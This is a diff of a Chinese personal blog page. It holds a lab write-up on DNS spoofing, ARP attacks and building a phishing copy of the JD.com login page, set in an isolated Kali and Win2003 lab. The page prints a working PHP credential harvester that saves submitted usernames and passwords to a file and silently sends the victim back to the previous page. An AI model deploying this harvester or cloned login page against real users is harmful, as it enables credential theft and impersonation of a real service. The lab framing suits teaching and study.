@@ -8,12 +8,12 @@
   <link rel="dns-prefetch" href="https://sunzhengyu99.github.io">
   <title>diaoyu | 一路走到黑</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#DNS欺骗、ARP攻击及钓鱼网站制作">
+  <meta name="description" content="DNS欺骗、ARP攻击及钓鱼网站制作">
 <meta property="og:type" content="article">
 <meta property="og:title" content="diaoyu">
 <meta property="og:url" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/index.html">
 <meta property="og:site_name" content="一路走到黑">
-<meta property="og:description" content="#DNS欺骗、ARP攻击及钓鱼网站制作">
+<meta property="og:description" content="DNS欺骗、ARP攻击及钓鱼网站制作">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/tuopu.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/1.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/2.png">
@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/7.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/8.png">
 <meta property="article:published_time" content="2020-07-18T09:37:15.000Z">
-<meta property="article:modified_time" content="2020-07-18T09:39:02.451Z">
+<meta property="article:modified_time" content="2020-07-18T09:47:11.294Z">
 <meta property="article:author" content="sunzy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/tuopu.png">
@@ -179,8 +179,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#DNS欺骗、ARP攻击及钓鱼网站制作</p>
-<a id="more"></a>
+        <h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><a id="more"></a>
 <p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$nam = stripslashes($_POST[<span class="string">'name'</span>]); <span class="comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span></span><br><span class="line">$pas = stripslashes($_POST[<span class="string">'pass'</span>]);<span class="comment">//pass也一样</span></span><br><span class="line">$content = <span class="string">"您已捕获京东账号及密码1个："</span> . <span class="string">" 用户名 "</span> . $nam . <span class="string">" 密码 "</span> . $pas;   <span class="comment">//保存捕获的用户名和密码</span></span><br><span class="line">$filed = @fopen(<span class="string">"1.txt"</span>, <span class="string">"a+"</span>);   <span class="comment">//打开1.txt</span></span><br><span class="line">@fwrite($filed, <span class="string">"$content\n"</span>);     <span class="comment">//将用户名和密码写入1.txt</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">goBack</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			window.history.back() <span class="comment">//后退+刷新</span></span><br><span class="line">		&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=<span class="string">"goBack()"</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
@@ -291,8 +290,8 @@
     </a>
   
   
-    <a href="/2020/07/18/%E9%92%93%E9%B1%BC/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">钓鱼</div>
+    <a href="/2020/07/16/test%20jd/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">test jd</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -440,10 +439,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sunzy</a>
-              </li>
             
             <div class="clearfix"></div>
           </ul>
